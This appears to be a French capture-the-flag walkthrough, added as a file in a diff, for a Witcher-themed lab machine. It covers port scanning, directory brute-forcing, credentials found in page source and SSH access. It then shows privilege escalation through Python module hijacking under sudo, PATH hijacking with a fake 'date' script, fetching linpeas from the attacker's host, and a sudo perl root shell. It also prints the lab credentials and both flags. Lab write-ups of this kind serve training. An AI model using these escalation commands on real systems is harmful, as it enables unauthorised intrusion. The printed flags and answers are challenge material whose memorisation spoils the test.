@@ -1,0 +1,48 @@
+Dans un premier temps, vous effectuez une analyse de port avec Nmap en utilisant la commande "nmap [IP]". Cette analyse vous révèle l'ouverture des ports SSH et HTTP.
+
+Vous décidez d'explorer le port HTTP à l'aide de DirBuster. Vous découvrez un sous-répertoire nommé "/t". Pour confirmer, vous relancez DirBuster avec l'URL "[IP]/t/" et trouvez un autre sous-répertoire nommé "/t/o".
+
+En continuant cette démarche, vous réalisez progressivement que les sous-répertoires que vous trouvez suivent les paroles de la chanson "Toss a Coin" (lancer une pièce en français).
+
+Vous accédez à l'URL suivante : "http://[IP]/t/o/s/s//a//c/o/i/n//t/o//y/o/u/r//w/i/t/c/h/e/r//o/h//v/a/l/l/e/y//o/f/_/p/l/e/n/t/y/".
+
+En explorant le code source de cette page, vous découvrez des identifiants : jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose.
+
+Vous utilisez ces identifiants pour vous connecter via SSH en exécutant la commande "ssh jaskier@[IP]" avec le mot de passe correspondant.
+
+Vous parvenez à vous connecter à la machine distante en tant qu'utilisateur Jaskier. Vous trouvez le premier flag dans le fichier user.txt : "EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}".
+
+En utilisant la commande "sudo -l", vous vérifiez les privilèges supplémentaires accordés à l'utilisateur Jaskier. Vous remarquez que vous pouvez exécuter un script Python en tant qu'utilisateur "yen".
+
+Vous avez l'idée de remplacer le script "random.py" utilisé par le script Python avec un reverse shell pour obtenir un accès en tant qu'utilisateur "yen". Vous créez un nouveau fichier "random.py" avec le contenu suivant :
+
+import os
+os.system("/bin/bash")
+
+Vous exécutez ensuite la commande "sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py" pour que le script Python soit exécuté avec les privilèges de l'utilisateur "yen".
+
+Si tout se déroule comme prévu, vous avez maintenant un accès en tant qu'utilisateur "yen".
+
+En explorant le répertoire home de "yen", vous trouvez un fichier nommé "portal". Lorsque vous l'exécutez, vous remarquez qu'il utilise probablement la commande bash "date".
+
+Vous décidez de modifier ce fichier en créant un nouveau fichier nommé "date" avec le contenu suivant :
+
+#!/bin/bash
+/bin/bash
+
+Vous attribuez les permissions d'exécution au fichier "date" en utilisant la commande "chmod +x date". Ensuite, vous ajoutez le répertoire "/home/yen" à la variable PATH en utilisant la commande "export PATH=/home/yen:$PATH".
+
+Maintenant, lorsque vous exécutez le programme "portal", il exécutera le fichier "date" que vous avez modifié, vous donnant ainsi un accès en tant qu'utilisateur "Geralt".
+
+Dans le répertoire home de "Geralt", vous trouvez un fichier nommé "password.txt" contenant le texte "IH4teP0rt4ls".
+
+Vous décidez d'utiliser l'outil "linpeas" pour rechercher des vulnérabilités. Vous exécutez un serveur Python en local en utilisant la commande "python -m http.server 1234" et sur la machine "Geralt", vous téléchargez le fichier "linpeas.sh" en utilisant la commande "wget [IP machine locale]:1234/linpeas.sh".
+
+Après avoir téléchargé "linpeas.sh", vous lui attribuez les permissions d'exécution en utilisant la commande "chmod +x linpeas.sh".
+
+Avant d'exécuter "linpeas.sh", vous réinitialisez la variable PATH en utilisant la commande "PATH=$(getconf PATH)" pour éviter tout blocage potentiel.
+
+Vous exécutez finalement la commande "sudo perl -e 'exec "/bin/sh";'" qui vous permet de devenir l'utilisateur root.
+
+En tant que root, vous affichez le contenu du fichier "root.txt" avec la commande "cat /root/root.txt", et vous obtenez le dernier flag : "EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}".
+
